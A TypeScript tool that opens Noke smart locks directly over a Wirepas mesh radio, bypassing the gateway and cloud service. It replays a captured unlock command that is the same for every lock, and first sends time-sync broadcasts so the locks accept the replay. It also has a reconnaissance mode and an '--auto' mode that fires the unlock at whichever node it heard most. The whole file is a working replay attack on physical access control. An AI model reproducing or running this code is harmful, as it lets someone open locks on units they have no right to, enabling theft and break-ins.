/**
 * Direct lock unlock via Wirepas mesh — no gatewaygo, no Noke cloud.
 *
 * Replays the 20-byte APDU captured from gatewaygo's bleunlock command.
 * The APDU is generic for the unlock operation; the lock authenticates
 * us by virtue of our chip having the same network cipher key, which
 * Wirepas applies at the network layer transparently.
 *
 * Usage:
 *   node dist/wirepas/wirepasUnlock.js 13CD89          # short_mac (3 bytes)
 *   node dist/wirepas/wirepasUnlock.js E8:84:27:13:CD:89   # full BLE MAC
 */

import { WirepasTransport } from './transport';
import {
  buildDsapDataTx, parseDsapDataRx, PRIM, PRIM_NAME, DataRxIndication,
  buildMsapAttrRead, MSAP_ATTR, buildStackStart, buildStackStop,
} from './frame';

const PORT = process.env.WIREPAS_PORT ?? '/dev/ttyS3';
const BAUD = Number(process.env.WIREPAS_BAUD ?? 125000);

// Captured from gatewaygo's bleunlock for both unit 1213 and unit 1234 — identical bytes,
// so this is the network-layer-authenticated unlock command, not per-lock.
const UNLOCK_APDU = Buffer.from('3400000200a200000000000000000000000000a2', 'hex');

// Pre-unlock mesh broadcasts (captured from gatewaygo startup): the locks
// validate unlock commands against their internal clock to prevent replay,
// so a fresh timezone+time broadcast must hit them before unlock will succeed.
const HELLO_APDU       = Buffer.from('3c', 'hex');                 // ep=9 and ep=13
const TIMEZONE_APDU    = Buffer.from('414038000001', 'hex');        // ep=9 — UTC-4 (Noke's site default)
function buildTimeApdu(): Buffer {
  const t = Math.floor(Date.now() / 1000);
  const apdu = Buffer.alloc(5);
  apdu[0] = 0x40;
  apdu.writeUInt32LE(t, 1);
  return apdu;
}

const SRC_EP = 10;
const DST_EP = 9;     // unlock destination endpoint
const BROADCAST = 0xffffffff;
const TX_TIMEOUT_MS  = 5_000;
const RX_WAIT_MS     = 8_000;
const POLL_PERIOD_MS = 200;
const DEBUG = process.env.WIREPAS_DEBUG !== '0';

function parseTarget(s: string): { shortMac: string; address: number } {
  const clean = s.replace(/[:\s]/g, '').toUpperCase();
  if (clean.length !== 6 && clean.length !== 12) {
    throw new Error(`target must be 3-byte short_mac (6 hex) or full BLE MAC (12 hex), got "${s}"`);
  }
  const shortMac = clean.slice(-6); // last 3 bytes of the MAC
  // 32-bit Wirepas node address: 0x00 high byte + last 3 bytes of MAC.
  // E.g. short_mac "13CD89" -> address 0x0013CD89.
  const address = parseInt(shortMac, 16);
  return { shortMac, address };
}

async function main(): Promise<number> {
  const arg = process.argv[2];
  if (!arg) {
    console.error('usage:');
    console.error('  wirepasUnlock.js <short_mac|full_mac>   unlock specific lock');
    console.error('  wirepasUnlock.js --listen [seconds]      mesh recon, default 30s');
    console.error('  wirepasUnlock.js --auto [seconds]        listen, then unlock most-active node');
    return 2;
  }

  // --listen / --auto: shared mesh recon path
  if (arg === '--listen' || arg === '--auto') {
    const seconds = Number(process.argv[3] ?? 30);
    const t = new WirepasTransport({ path: PORT, baudRate: BAUD, debug: false, pollIntervalMs: 0 });
    await t.open();
    const heardFrom = new Map<number, number>();
    t.on('indication', (p) => {
      if (p.primitive !== PRIM.DSAP_DATA_RX_INDICATION) return;
      const ind = parseDsapDataRx(p.payload);
      if (!ind) return;
      heardFrom.set(ind.srcAddress, (heardFrom.get(ind.srcAddress) ?? 0) + 1);
    });
    console.log(`[recon] listening ${seconds}s for mesh activity...`);
    const start = Date.now();
    while (Date.now() - start < seconds * 1000) {
      try { await t.pollIndications(); } catch { /* ignore */ }
      await new Promise(r => setTimeout(r, 200));
    }
    const sorted = [...heardFrom.entries()].sort((a, b) => b[1] - a[1]);
    console.log(`[recon] heard from ${heardFrom.size} unique node(s):`);
    for (const [addr, count] of sorted) {
      console.log(`  0x${addr.toString(16).padStart(8, '0')}  x${count}`);
    }

    if (arg === '--listen') { await t.close(); return 0; }

    // --auto: pick the most-active non-self node and immediately fire unlock
    // through the SAME transport (don't close — we'd lose the just-built route).
    const myNodeAddr = 0x00159e43;
    const target = sorted.find(([a]) => a !== myNodeAddr);
    if (!target) {
      console.log('[auto] no candidate target heard — aborting');
      await t.close();
      return 5;
    }
    const [autoAddr] = target;
    console.log(`[auto] firing unlock at 0x${autoAddr.toString(16).padStart(8, '0')} (heard ${target[1]}x in last ${seconds}s — route is fresh)`);

    let unlockSentAt = Date.now();
    let response: DataRxIndication | null = null;
    t.on('indication', (p) => {
      if (p.primitive !== PRIM.DSAP_DATA_RX_INDICATION) return;
      const ind = parseDsapDataRx(p.payload);
      if (!ind || ind.srcAddress !== autoAddr) return;
      if (Date.now() - unlockSentAt < 10) return; // ignore RX-in-flight at TX moment
      response = ind;
      console.log(`[auto]   RESPONSE  hops=${ind.hopCount}  t=${ind.travelTimeMs}ms  apdu(${ind.apdu.length})=${ind.apdu.toString('hex')}`);
    });
    let pdu = 0x0001;
    await t.send((fid) => buildDsapDataTx(fid, {
      pduId: pdu++, sourceEndpoint: SRC_EP, destAddress: autoAddr, destEndpoint: DST_EP,
      qos: 1, requestTxIndication: false, apdu: UNLOCK_APDU,
    }), TX_TIMEOUT_MS).catch(e => console.log(`[auto]   TX confirm timeout: ${e.message} (proceeding)`));
    unlockSentAt = Date.now();

    const waitStart = Date.now();
    const r = (): DataRxIndication | null => response;
    while (!r() && Date.now() - waitStart < RX_WAIT_MS) {
      try { await t.pollIndications(); } catch { /* ignore */ }
      await new Promise(rr => setTimeout(rr, POLL_PERIOD_MS));
    }
    await t.close();
    const got = r();
    if (got) {
      console.log(`[auto] SUCCESS — first response byte 0x${got.apdu[0].toString(16).padStart(2,'0')}`);
      return 0;
    }
    console.log('[auto] no response from target within timeout');
    return 1;
  }

  const { shortMac, address } = parseTarget(arg);
  console.log(`[unlock] target short_mac=${shortMac} -> wirepas dst=0x${address.toString(16).padStart(8, '0')}`);

  const t = new WirepasTransport({ path: PORT, baudRate: BAUD, debug: DEBUG, pollIntervalMs: 0 });
  await t.open();
  void buildMsapAttrRead; void MSAP_ATTR; void buildStackStart; void buildStackStop;

  // Single indication listener. Tracks every node we've heard from for routing,
  // and conditionally records "lock response" only if the indication arrived
  // after we fired the unlock (so heartbeats during route discovery don't get
  // mistaken for an unlock acknowledgement).
  const heardFrom = new Set<number>();
  let unlockSentAt: number | null = null;
  let response: DataRxIndication | null = null;
  t.on('indication', (p) => {
    if (p.primitive !== PRIM.DSAP_DATA_RX_INDICATION) return;
    const ind = parseDsapDataRx(p.payload);
    if (!ind) return;
    heardFrom.add(ind.srcAddress);
    const fromAddr = '0x' + ind.srcAddress.toString(16).padStart(8, '0');
    if (ind.srcAddress === address) {
      if (unlockSentAt !== null && !response) {
        response = ind;
        console.log(`[unlock]   RESPONSE  from=${fromAddr}  hops=${ind.hopCount}  t=${ind.travelTimeMs}ms  apdu(${ind.apdu.length})=${ind.apdu.toString('hex')}`);
      } else {
        console.log(`[unlock]   ✓ heard from target  hops=${ind.hopCount}  t=${ind.travelTimeMs}ms  apdu(${ind.apdu.length})=${ind.apdu.toString('hex')}`);
      }
    }
  });

  // ===== Phase 1: discover the route to target lock =====
  // Chip's routing table is built from received indications. Without a recent
  // broadcast from `address`, the chip can't route our TX and it gets dropped.
  console.log('[unlock] phase 1: listening for any indication from target lock...');
  const listenStart = Date.now();
  const LISTEN_FOR_TARGET_MS = 30_000;
  while (heardFrom.has(address) === false && Date.now() - listenStart < LISTEN_FOR_TARGET_MS) {
    try { await t.pollIndications(); } catch { /* ignore */ }
    await new Promise(r => setTimeout(r, 200));
  }
  if (!heardFrom.has(address)) {
    console.log(`[unlock] timed out after ${Date.now()-listenStart}ms; target never broadcast`);
    console.log('[unlock] heard from:', [...heardFrom].map(a => '0x' + a.toString(16).padStart(8,'0')).join(' '));
    await t.close();
    return 4;
  }
  console.log(`[unlock] target reachable (heard from ${heardFrom.size} node(s) in ${Date.now()-listenStart}ms)`);

  // ===== Pre-unlock broadcasts (mesh-wide time sync) =====
  // Without these the locks reject unlock commands silently because
  // they can't validate the unlock against a current time window.
  let pdu = 0x0001;
  const broadcastTx = async (label: string, dst_ep: number, apdu: Buffer) => {
    const id = pdu++;
    console.log(`[unlock] broadcast ${label}: pdu=0x${id.toString(16).padStart(4,'0')} dst_ep=${dst_ep} apdu=${apdu.toString('hex')}`);
    try {
      const c = await t.send((fid) => buildDsapDataTx(fid, {
        pduId: id, sourceEndpoint: SRC_EP, destAddress: BROADCAST,
        destEndpoint: dst_ep, qos: 1, requestTxIndication: false, apdu,
      }), TX_TIMEOUT_MS);
      console.log(`[unlock]   confirm result=${c.payload[2]} queue_cap=${c.payload[3]}`);
    } catch (e: any) {
      console.log(`[unlock]   ${label}: ${e.message} (proceeding)`);
    }
    await new Promise(r => setTimeout(r, 100));
  };

  await broadcastTx('hello-ep9 ', 9,  HELLO_APDU);
  await broadcastTx('hello-ep13', 13, HELLO_APDU);
  await broadcastTx('timezone  ', 9,  TIMEZONE_APDU);
  await broadcastTx('time-sync ', 13, buildTimeApdu());

  // Brief settle so locks can update their internal clock before we ask one to unlock
  console.log('[unlock] settling 1.5s for mesh to propagate time sync...');
  await new Promise(r => setTimeout(r, 1500));

  // Mark the moment we fire the unlock so the indication handler can distinguish
  // the lock's actual response from random heartbeats arriving simultaneously.
  unlockSentAt = Date.now();
  void PRIM_NAME;

  const pduId = pdu++;
  console.log(`[unlock] firing DSAP-DATA-TX (unlock)  pdu=0x${pduId.toString(16).padStart(4, '0')} src_ep=${SRC_EP} dst_ep=${DST_EP} apdu=${UNLOCK_APDU.toString('hex')}`);
  // Build the frame and write it directly without waiting for the matched confirm
  await t.send((fid) => buildDsapDataTx(fid, {
    pduId, sourceEndpoint: SRC_EP, destAddress: address, destEndpoint: DST_EP,
    qos: 1, requestTxIndication: false, apdu: UNLOCK_APDU,
  }), TX_TIMEOUT_MS).catch((e) => {
    console.log(`[unlock]   TX confirm not received (${e.message}) — proceeding anyway`);
  });

  console.log(`[unlock] waiting up to ${RX_WAIT_MS}ms for lock response...`);
  const start = Date.now();
  while (!response && Date.now() - start < RX_WAIT_MS) {
    try { await t.pollIndications(); } catch { /* ignore */ }
    await new Promise(r => setTimeout(r, POLL_PERIOD_MS));
  }

  await t.close();

  // TS narrows `response` to `never` because the assignment happens in an event
  // handler closure that TS can't trace. Cast through unknown to defeat narrowing.
  const r = response as unknown as DataRxIndication | null;
  if (r) {
    console.log(`[unlock] SUCCESS — lock responded in ${Date.now() - start}ms`);
    console.log(`[unlock] response APDU first byte 0x${r.apdu[0].toString(16).padStart(2, '0')} (gatewaygo treated 0x50/0x75 as success)`);
    return 0;
  }
  console.log('[unlock] no response from lock within timeout');
  return 1;
}

main().then(code => process.exit(code), e => { console.error('[unlock] fatal:', e); process.exit(2); });
